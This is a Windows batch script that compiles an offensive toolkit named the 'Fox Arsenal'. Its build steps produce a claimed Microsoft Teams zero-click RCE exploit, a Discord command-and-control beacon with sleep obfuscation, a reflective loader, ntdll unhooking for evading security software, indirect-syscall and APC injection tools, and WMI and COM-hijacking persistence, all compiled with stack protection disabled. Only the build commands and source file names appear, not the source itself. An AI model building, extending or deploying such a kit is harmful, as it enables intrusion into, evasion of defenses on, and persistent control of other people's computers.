@echo off
setlocal

:: Set the working directory to the location of the batch file
cd /d "%~dp0"

echo [*] Starting Compilation of the Fox Arsenal...

:: Create a bin directory for the output
if not exist "bin" mkdir bin

echo [*] Compiling CVE-2025-23198 (Microsoft Teams Zero-Click RCE)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc cve_2025_23198_teams_rce.cpp /link /OUT:bin\teams_rce.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Native Discord C2 Beacon (v2) with Ekko Sleep...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\main_beacon_v2.cpp /Tc discord_c2_v2\sleep_ekko.cpp /link /OUT:bin\beacon_v2.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Custom Reflective Loader (sRDI)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\reflective_loader.cpp /link /OUT:bin\loader.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Evasion (Ntdll Unhooking)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\evasion_native.cpp /link /OUT:bin\evasion.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Indirect Syscalls (Halo's Gate)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\injection_indirect_syscalls.cpp /link /OUT:bin\syscalls.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling APC Injection...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\injection_apc.cpp /link /OUT:bin\apc_inject.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling WMI Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\persistence_wmi.cpp /link /OUT:bin\persist_wmi.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling COM Hijacking Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\persistence_com_hijack.cpp /link /OUT:bin\persist_com.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

:: Clean up object files
del *.obj >nul 2>&1

echo [*] Compilation complete. Check the 'bin' folder.
